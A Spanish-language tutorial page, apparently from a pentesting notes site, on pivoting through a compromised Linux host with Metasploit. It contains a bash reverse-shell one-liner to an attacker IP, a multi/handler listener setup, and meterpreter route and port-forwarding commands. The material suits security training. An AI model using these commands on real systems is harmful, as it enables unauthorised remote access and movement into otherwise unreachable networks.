# 🐧 Linux

{% hint style="info" %}
El Pivoting solo se podrá hacer si el host tiene más de una interfaz de red (sin contar loopback)
{% endhint %}

Para hacer pivoting en entornos Linux, deberemos explotar la maquina que tiene acceso a ambas redes.

## Metasploit

Una vez tengamos una shell en dicha maquina, nos entablamos una reverse shell desde la maquina victima a la atacante:

```bash
msfconsole

use multi/handler

set LHOST 192.168.1.1

set LPORT 4242

set PAYLOAD linux/x86/meterpreter/reverse_tcp

run
```

Ahora desde la maquina victima, ejecutamos un comando como este:

```bash
/bin/bash -i >& /dev/tcp/192.168.1.1/4242 0>&1
```

Una vez recibimos la sesión de meterpreter, comprobamos que existan varias interfaces de  red, en concreto, una de la red a la que tenemos visibilidad y otra que se conecte a la red que no podemos ver:

<figure><img src="../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

Ahora, y para redireccionar el trafico de la interfaz enp0s8 (interfaz conectada a la red que no tenemos visibilidad), podemos la sesión en segundo plano y usamos el siguiente comando:

```bash
route add IP-INTERFAZ-SECUNDARIA MASCARA-DE-RED ID-SESION
```

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

### Port Forwarding

En el port forwarding, lo que hacemos es pasarnos un puerto de la maquina victima a uno local nuestro, por ejemplo, imagina que la maquina victima, tiene el puerto 80 abierto, pues con la ayuda del port forwarding, podríamos pasarnos el puerto 80 de la victima a nuestro puerto 80 en localhost. Para ello, usamos el siguiente comando en metasploit:

```bash
portfwd add -l PUERTO-LOCAL -p PUERTO-VICTIMA -r IP-VICTIMA
```

<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
